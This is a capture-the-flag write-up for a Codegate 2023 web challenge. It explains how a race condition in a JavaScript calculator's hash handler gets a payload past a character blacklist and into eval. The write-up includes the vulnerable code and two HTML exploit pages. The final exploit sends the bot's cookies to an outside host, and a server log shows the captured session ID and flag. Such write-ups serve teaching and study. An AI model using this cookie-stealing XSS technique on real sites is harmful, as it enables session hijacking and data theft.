# Calculator

This web challenge offered a simple JavaScript based calculator.
We are given full source code for the problem, which was greatly appreciated!

The problem consists of a webserver written in PHP and a JavaScript bot using chrome headless using puppeteer.

The webpage has very little functionality. It allows to register an account, then login to this account. Once logged in, one can use a calculator and finally submit a URL to the bot.

So I was interested what exactly the bot does. It logs into the website as `guest:guest`, sets the `FLAG` cookie with the flag as its value, and then visits the URL we provided. The cookie has the `httpOnly` flag set to false. So I assumed the goal was to get XSS in the calculator and then target the bot to extract the flag.

The interesting function was in `calculate.php`. It looks as follows:
```php
<script>
function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
                
}
window.onhashchange = async ()=>{
    let code = atob(location.hash.slice(1));
    console.log(code);
    window.isDebug =  (await fetch("/api/debug.php").then((response)=>{
        return response.json();
    }).then((data)=>{
        return Number(data.isDebug);
    }));
    if(window.isDebug) {
        let result = eval(atob(location.hash.slice(1)));
        window.parent.postMessage({result: result, hacker: 0},"*");
    } else if(localStorage.getItem(code)) {
        let result = localStorage.getItem(code);
        window.parent.postMessage({result: result, hacker: 0},"*");
        localStorage.removeItem(code);
    } else {
        if(/!|@|#|\$|\^|&|_|;|\"|\'|\[|\]|\{|\}|[g-w]|[y-z]/.test(code)){
            alert("Are you hacker??");
            window.parent.postMessage({result: null, hacker: 1},"*");
            return;
        } else {
            let result = eval(atob(location.hash.slice(1)))
            console.log(result)
            localStorage.setItem(code, result);
            window.parent.postMessage({result: result, hacker: 0},"*");
        }
    }
}

</script>
```
Basically, it triggers whenever the hash fragment of the URL changes. The fragment contains the base64 encoded calculation we input into the calculator.

 There is a whole bunch of checks and actions that are performed when the `isDebug` variable is set. As the server always responsed with `false` and I didn't see a way to change this I ignored the checks for the time being.

If `isDebug` is not set, the function checks for dangeours characters in our calculation using a regex. If it matches any of those characters, the website displays a popup with the value "Are you a hacker??".
Otherwise, our input is passed to `eval`.  

At first glance it looks like it's not possible to trigger an XSS with those restrictions. I usually do pwn problems, so I noticed a pattern you sometimes see in kernel problems. 

Initialy, the code is taken from the hash fragment and base64 decoded: `let code = atob(location.hash.slice(1));`
Then, it is checked against the blacklist using the regex.

Finally the result does not use the code previsously sanitized, but it directly uses the hash fragment again: `let result = eval(atob(location.hash.slice(1)))`.

This looked like a TOCTOU / double fetch race condition. If we can change the fragment between the check and the evaluation, it should be possible to avoid the check an pass arbitrary characters to `eval`, thus achieving XSS.

I asked ChatGPT and @bluepichu if it's possible to change the hash fragment and they told me it is possible.

Thus, I started to create a PoC that switches the hash fragment from a benign one (`1+1`) to a malicious one (`alert(11)`).

```JavaScript
<!DOCTYPE html>
<html>
<head>
  <title>Modify Location Hash</title>
  <script>

    function sleep(ms) {
    return new Promise((r) => setTimeout(r, ms));
                    
    }

function modifyLocationHash() {
      // Open the website
      var url = "http://pwn20//api/calculate.php";
      var win = window.open(url);
      sleep(5000);

      // Modify the location.hash
      var newHash = "http://pwn20/api/calculate.php#mSsx";
      win.location = newHash;

      var newHash = "http://pwn20/api/calculate.php#YWxlcnQoMTEp";
      win.location = newHash;
      
    }
  </script>
</head>
<body>
  <h1>Modify Location Hash Example</h1>
  <button onclick="modifyLocationHash()">Open and Modify</button>
</body>
</html>
```

After too many runs, the payload finally triggered. So I started to send it against the server. For this, a proof or work had to be calculated each time and I almost went insane after submitting the exploit numerous times and not getting the flag.

Finally, @bluepichu suggested to just switch back and forth between the two hashes, instead of just doing the race once. He struggled to get the pow code running on his mac, but shortly before the competition ended I started to get a lot of requests from the bot with the flag cookie. Luckily, I was not logged out of the CTF website and could submit the flag 1 minute before the deadline!

Afterwards I modified my exploit to work as well. This was the final XSS payload: `document.location="http://p3.yt/?ppp="+document.cookie`
```JavaScript
<!DOCTYPE html>
<html>
<head>
  <title>Modify Location Hash</title>
  <script>

    function sleep(ms) {
        return new Promise((r) => setTimeout(r, ms));                
    }

    host = "web"
    //host = "15.165.237.22"
    //host = "pwn20"

    async function benign(win){
        win.location = "http://"+host+"/api/calculate.php#mSsx";
    }

    async function evil(win){
        win.location = "http://"+host+"/api/calculate.php#ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9wMy55dC8/cHBwPSIrZG9jdW1lbnQuY29va2ll";
    }

    async function modifyLocationHash() {
      // Open the website
      var url = "http://"+host+"/api/calculate.php"
      var win = window.open(url);
      await sleep(1000);

      // Modify the location.hash

      for (let i = 0; i < 10000; i++) {
        benign(win);
        await sleep(2);
        evil(win);
        await sleep(2);
      }
    }
    
  </script>
</head>
<body onload="modifyLocationHash()">
  <h1>Modify Location Hash Example</h1>
</body>
</html>
```

After submitting the exploit, the worker bot connected to my server and sent the flag cookie:
```bash
# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
15.165.237.22 - - [18/Jun/2023 15:06:02] "GET /exploit.html HTTP/1.1" 200 -
15.165.237.22 - - [18/Jun/2023 15:06:03] "GET /?ppp=PHPSESSID=1e3e89007dbc1d736da6fcbd74dfe81c;%20FLAG=codegate2023{056a7969[CUT]7ee9a3664} HTTP/1.1" 200 -
```

Thanks again to @bluepichu for coming in clutch last minute by fixing the exploit!
